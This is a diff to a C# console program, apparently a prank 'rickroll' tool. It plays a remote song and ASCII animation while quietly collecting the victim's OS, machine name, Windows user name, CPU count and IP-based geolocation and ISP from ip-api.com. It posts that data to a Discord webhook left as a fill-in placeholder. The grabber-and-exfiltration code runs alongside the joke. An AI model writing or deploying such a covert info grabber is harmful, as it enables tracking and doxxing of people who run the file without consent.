@@ -1,10 +1,15 @@
+using NAudio.Wave; // NAuido from NuGet*
 using System;
+using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Runtime.InteropServices;
+using System.Security.Policy;
 using System.Text;
 using System.Text.Encodings.Web;
 using System.Text.Json;
@@ -17,6 +22,23 @@ namespace CMD_Csharp_EDITION
 {
     internal class Program
     {
+        static string rickrol_url = "https://zvukoviku.ru/sounds/1651485572_18775-rickroll354.mp3";
+        static Thread play_rick = new Thread(() =>
+        {
+            using (var mf = new MediaFoundationReader(rickrol_url))
+            using (var wo = new WasapiOut())
+            {
+                wo.Init(mf);
+                wo.Play();
+                while (wo.PlaybackState == PlaybackState.Playing)
+                {
+                    Thread.Sleep(1000);
+                }
+            } // Копипаста из доков NAudio
+        });
+        //const string rickrol_url = "https://zvukoviku.ru/sounds/1651485572_18775-rickroll354.mp3";
+        //static string rickrol_fie = Path.GetTempPath() + "rickrol.mp3";
+
         static HttpClient httpClient = new HttpClient();
         static HttpClient httpClient_ip = new HttpClient();
         [STAThread]
@@ -27,7 +49,7 @@ namespace CMD_Csharp_EDITION
 
             systemInfo.Add("OS_INFO", Environment.OSVersion.ToString()); // Windows 10 12.4.16.2.0
             systemInfo.Add("PC_NAME", Environment.MachineName);
-            systemInfo.Add("USER", Environment.UserName); // Pro_gamer123 (name of user windows)
+            systemInfo.Add("USER", Environment.UserName); // Pro_gamer123 (name of window suser)
 
             Thread thread = new Thread(() =>
             {
@@ -51,18 +73,25 @@ namespace CMD_Csharp_EDITION
 
             systemInfo.Add("PROCESSOR_COUNT", Environment.ProcessorCount.ToString()); //Ядра процессора
 
-            using var request_ip = new HttpRequestMessage(HttpMethod.Get, "http://ip-api.com/json/?lang=ru&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");
-
-            using var response_ip = await httpClient_ip.SendAsync(request_ip);
-            string responseIP_text = await response_ip.Content.ReadAsStringAsync();
-
-            var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
-            string prettyJson = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
+            string prettyJson; // Обьявление до блока try-catch
+            try
             {
-                WriteIndented = true,
-                Encoder = JavaScriptEncoder.Create(UnicodeRanges.BasicLatin, UnicodeRanges.Cyrillic)
-            });
+                using var request_ip = new HttpRequestMessage(HttpMethod.Get, "http://ip-api.com/json/?lang=ru&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");
 
+                using var response_ip = await httpClient_ip.SendAsync(request_ip);
+                string responseIP_text = await response_ip.Content.ReadAsStringAsync();
+
+                var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
+                prettyJson = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
+                {
+                    WriteIndented = true,
+                    Encoder = JavaScriptEncoder.Create(UnicodeRanges.BasicLatin, UnicodeRanges.Cyrillic)
+                });
+            }
+            catch (Exception except) 
+            {
+                prettyJson = $"[ОШИБКА ПРИ ПОЛУЧЕНИИ JSON: {except}]";
+            }
 
             string payload = $"""
                 ## Чел попался на рикрол :woman_in_manual_wheelchair: :pig2:
@@ -85,7 +114,7 @@ namespace CMD_Csharp_EDITION
             {
                 content = payload,
                 username = "Rickrol",
-                avatar_url = "https://jollycontrarian.com/images/6/6c/Rickroll.jpg?20170403162336"
+                avatar_url = "https://jollycontrarian.com/images/6/6c/Rickroll.jpg?20170403162336",
             };
 
             string json = JsonSerializer.Serialize(jsonObject);
@@ -94,24 +123,23 @@ namespace CMD_Csharp_EDITION
 
             try
             {
-                using var request = new HttpRequestMessage(HttpMethod.Post, "DISCORD_WEEBHOOK_HERE");
+                using var request = new HttpRequestMessage(HttpMethod.Post, "YOUR_WEBHOOK"); // webhook here
                 request.Content = content;
 
                 using var response = await httpClient.SendAsync(request);
                 string responseText = await response.Content.ReadAsStringAsync();
 
             }
-            catch (System.InvalidOperationException) { }
+            catch (System.InvalidOperationException) {  }
             finally
             {
+                //byte[] bytes = await httpClient.GetByteArrayAsync(rickrol_url);
+                //File.WriteAllBytes(rickrol_fie, bytes); 
+                play_rick.Start();
                 Console.ForegroundColor = ConsoleColor.Green;
                 Process.Start("curl", "ascii.live/rick"); // curl запрос к опен сурс проекту (знаменитый рикрол в консоли)
+                play_rick.Join();
             }
-        
-
-
-
-
         }
     }
 }
